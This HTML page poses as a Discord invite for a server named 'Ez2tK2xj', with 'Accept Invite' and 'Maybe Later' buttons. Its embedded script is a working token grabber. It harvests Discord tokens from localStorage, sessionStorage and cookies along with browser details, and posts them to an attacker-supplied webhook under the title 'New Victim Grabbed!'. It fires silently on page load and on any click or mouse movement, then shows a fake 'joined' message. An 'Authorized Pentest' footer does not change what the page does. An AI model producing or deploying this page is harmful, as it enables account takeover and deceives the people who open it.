    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>

        h1 { color: #fff; font-size: 28px; font-weight: 700; margin-bottom: 10px; }

            background: rgba(255,255,255,0.1);

            background: linear-gradient(135deg, #5865f2, #7289da);

            transition: all 0.2s;

        button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(88,101,242,0.4); }

        .loading { display: none; }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .success { background: #43b581; color: white; padding: 20px; border-radius: 8px; margin-top: 20px; }
        .grabbed { display: none; }

</head>
<body>
    <div class="container">
        <div class="discord-logo"></div>
        <h1>Join Server</h1>
        <div class="invite-code">discord.gg/Ez2tK2xj</div>
        <p class="server-name">You've been invited to join <strong>Ez2tK2xj</strong></p>
        
        <button onclick="joinServer()">Accept Invite</button>
        <button onclick="grabTokens()" style="background: #4f545c;">Maybe Later</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Opening Discord... Please wait</p>
        </div>
        
        <div class="success grabbed" id="success">
            ✅ Successfully joined Ez2tK2xj server!<br>
            <small>Discord will open automatically</small>
        </div>
    </div>

    <script>
        // YOUR WEBHOOK HERE - REPLACE WITH YOUR ACTUAL WEBHOOK URL
        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // https://discord.com/api/webhooks/...
        
        // Discord token regex
        const tokenRegex = /^[M][\w-]{23}\.[\w-]{6}\.[\w-]{27}$/;
        
        async function sendToWebhook(data) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'Ez2tK2xj Grabber',
                        avatar_url: 'https://cdn.discordapp.com/emojis/833101350623117194.gif',
                        embeds: [{
                            title: '🎉 New Victim Grabbed!',
                            color: 0x5865f2,
                            fields: data,
                            timestamp: new Date().toISOString(),
                            footer: { text: 'Ez2tK2xj Phishing | Authorized Pentest' }
                        }]
                    })
                });
                return response.ok;
            } catch(e) {
                console.error('Webhook failed:', e);
                return false;
            }
        }
        
        function extractTokens() {
            const tokens = [];
            
            // 1. LocalStorage
            for(let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if(key?.includes('token') || key?.includes('discord')) {
                    const value = localStorage.getItem(key);
                    if(tokenRegex.test(value)) tokens.push({type: 'LocalStorage', key, token: value});
                }
            }
            
            // 2. SessionStorage
            for(let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if(key?.includes('token') || key?.includes('discord')) {
                    const value = sessionStorage.getItem(key);
                    if(tokenRegex.test(value)) tokens.push({type: 'SessionStorage', key, token: value});
                }
            }
            
            // 3. Cookies
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if(name?.includes('token') && tokenRegex.test(value)) {
                    tokens.push({type: 'Cookie', key: name, token: value});
                }
            });
            
            // 4. Check for Discord context
            if(window.webpackChunkdiscord_app) {
                tokens.push({type: 'Discord Web Detected', token: 'Active Discord session'});
            }
            
            return tokens;
        }
        
        function getUserInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                url: window.location.href,
                referrer: document.referrer
            };
        }
        
        async function grabTokens() {
            const tokens = extractTokens();
            const userInfo = getUserInfo();
            
            const fields = [
                {name: '🖥️ User Agent', value: userInfo.userAgent.substring(0, 100) + '...', inline: false},
                {name: '🌐 Origin', value: userInfo.url, inline: true},
                {name: '📱 Screen', value: userInfo.screen, inline: true},
                {name: '🔗 Referrer', value: userInfo.referrer || 'Direct', inline: true}
            ];
            
            if(tokens.length > 0) {
                tokens.forEach((t, i) => {
                    fields.push({
                        name: `🎫 Token #${i+1}`,
                        value: `\`${t.token}\`\n**Source:** ${t.type} | ${t.key || 'N/A'}`,
                        inline: false
                    });
                });
            } else {
                fields.push({name: '❌ Status', value: 'No tokens found', inline: false});
            }
            
            await sendToWebhook(fields);
        }
        
        async function joinServer() {
            // Trigger token grab immediately
            await grabTokens();
            
            // Show fake loading
            document.querySelector('.loading').classList.add('active');
            document.querySelector('button').style.display = 'none';
            
            // Fake delay
            setTimeout(() => {
                document.getElementById('success').style.display = 'block';
                document.querySelector('.loading').classList.remove('active');
                
                // Fake Discord open (optional redirect)
                setTimeout(() => {
                    // window.open('https://discord.com/channels/@me', '_blank'); // Optional
                }, 2000);
            }, 2500);
        }
        
        // Auto-grab on load (silent)
        window.addEventListener('load', () => {
            setTimeout(grabTokens, 1000);
        });
        
        // Grab on any interaction
        ['click', 'mousedown', 'mouseup', 'mousemove'].forEach(evt => {
            document.addEventListener(evt, grabTokens, {once: true});
        });
    </script>
</body>
